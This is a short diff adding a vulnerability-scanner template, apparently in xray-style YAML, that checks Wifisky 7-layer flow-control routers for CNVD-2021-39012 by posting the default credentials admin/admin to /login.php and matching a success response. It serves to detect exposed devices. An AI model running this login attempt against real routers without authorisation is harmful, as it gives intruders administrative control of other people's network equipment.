@@ -1,0 +1,18 @@
+expression: r0()
+id: CNVD-2021-39012
+info:
+  author: Print1n(http://print1n.top)
+  description: "app=\"WIFISKY-7\u5C42\u6D41\u63A7\u8DEF\u7531\u5668\"\n"
+  name: Wifisky Default Password
+  reference:
+  - https://securityforeveryone.com/tools/wifisky-default-password-scanner
+  severity: high
+  verified: false
+rules:
+  r0:
+    expression: response.status == 200 && response.headers["content-type"].contains("text/html")
+      && response.body.bcontains(b'"success":"true"') && response.body.bcontains(b'"data":')
+    request:
+      body: username=admin&password=admin
+      method: POST
+      path: /login.php?action=login&type=admin
